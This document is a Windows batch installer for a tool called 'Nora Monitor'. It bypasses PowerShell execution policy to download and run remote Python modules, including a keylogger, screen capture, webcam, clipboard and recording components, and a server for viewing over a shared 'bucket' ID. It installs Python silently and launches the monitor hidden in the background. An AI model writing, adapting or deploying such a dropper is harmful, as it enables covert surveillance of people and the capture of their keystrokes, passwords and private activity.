@echo off
setlocal enabledelayedexpansion

set "DIR=%APPDATA%\NoraMonitor"
set "RAW=https://raw.githubusercontent.com/smallkhk/Nora-signal/nora-monitor-tool/nora-monitor"
set "CONFIG=%DIR%\config.json"

mkdir "%DIR%\templates" 2>nul
mkdir "%DIR%\recordings" 2>nul

:: Download all Python files from GitHub
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$r='%RAW%'; $d='%DIR%';" ^
  "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','camera.py','clipboard_monitor.py','processes.py','requirements.txt' | %%{ Invoke-WebRequest \"$r/$_\" -OutFile \"$d\$_\" };" ^
  "Invoke-WebRequest \"$r/templates/viewer.html\" -OutFile \"$d\templates\viewer.html\""

:: One-time setup - just ask for PC name and optional shared bucket ID
if not exist "%CONFIG%" (
    echo.
    echo ============================================================
    echo  NORA MONITOR - Quick Setup
    echo ============================================================
    echo.
    set /p PC_NAME=Name for this PC (e.g. Home PC):
    if "!PC_NAME!"=="" set PC_NAME=My PC
    echo.
    echo If you already have a Bucket ID from another PC, paste it below.
    echo Press Enter to skip and a new one will be created automatically.
    echo.
    set /p BUCKET_ID=Bucket ID (or press Enter to skip):

    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
      "$n='!PC_NAME!'; $b='!BUCKET_ID!';" ^
      "@{pc_name=$n; bucket_id=$b} | ConvertTo-Json | Set-Content '%CONFIG%'"
)

:: Install Python silently if not present
python --version >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
      "Invoke-WebRequest 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile '$env:TEMP\pysetup.exe'"
    %TEMP%\pysetup.exe /quiet InstallAllUsers=0 PrependPath=1
    timeout /t 20 /nobreak >nul
)

:: Install dependencies quietly
pip install -r "%DIR%\requirements.txt" -q --no-warn-script-location

:: Launch silently
start "" /D "%DIR%" pythonw "%DIR%\app.py"

echo.
echo Done! Nora Monitor is running.
echo Open http://localhost:9090 in your browser.
echo Your Bucket ID is saved in: %CONFIG%
echo.
pause
endlocal
